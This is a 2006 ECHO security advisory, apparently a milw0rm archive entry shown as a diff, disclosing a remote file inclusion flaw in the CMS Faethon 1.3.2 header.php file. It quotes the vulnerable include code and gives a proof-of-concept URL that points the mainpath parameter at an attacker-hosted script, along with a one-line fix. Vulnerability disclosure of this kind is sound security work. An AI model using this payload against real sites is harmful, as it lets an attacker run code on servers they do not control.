@@ -1,0 +1,87 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+					.OR.ID
+ECHO_ADV_33$2006
+
+---------------------------------------------------------------------------
+[ECHO_ADV_33$2006] CMS Faethon 1.3.2 mainpath Remote File Inclusion
+---------------------------------------------------------------------------
+
+Author       : M.Hasran Addahroni a.k.a K-159
+Date         : June, 16th 2006
+Location     : Indonesia, Bali
+Web          : http://advisories.echo.or.id/adv/adv33-K-159-2006.txt
+Critical Lvl : Highly critical
+Impact       : System access
+Where        : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+CMS Faethon 
+
+Application : CMS Faethon 
+version     : 1.3.2
+URL         : http://cmsfaethon.com/
+Description :
+
+CMS Faethon is content management system for different web pages.
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~~~
+
+in folder data we found vulnerability script header.php.
+
+-----------------------header.php----------------------
+....
+<?php
+        include($mainpath . 'survey.php');
+        ?>
+        <h2>RSS - cmsfaethon.com</h2>
+        <div class="rss-menu">
+                <?php
+                $source = 'http://cmsfaethon.com/feed/articles/rss2.php?LangSet=cs';
+                include($mainpath . 'rss-reader.php');
+        ?>
+...
+----------------------------------------------------------
+
+Variables $mainpath are not properly sanitized.When register_globals=on and allow_fopenurl=on an attacker can exploit this vulnerability with a simple php injection script.
+
+Proof Of Concept:
+~~~~~~~~~~~~~~~~
+
+http://target.com/[cms_faethon_path]/data/header.php?mainpath=http://attacker.com/evil.txt?
+
+Solution:
+~~~~~~~~
+
+sanitize variabel $mainpath in header.php
+
+
+---------------------------------------------------------------------------
+Shoutz:
+~~~~~~
+~ ping - my dearest wife, for all the luv the tears n the breath 
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,anonymous,kaiten
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw
+~ sinChan,x`shell,tety,sakitjiwa, m_beben, rizal, cR4SH3R, metalsploit
+~ newbie_hacker@yahoogroups.com 
+~ #aikmel #e-c-h-o @irc.dal.net
+---------------------------------------------------------------------------
+Contact:
+~~~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://k-159.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2006-06-16]
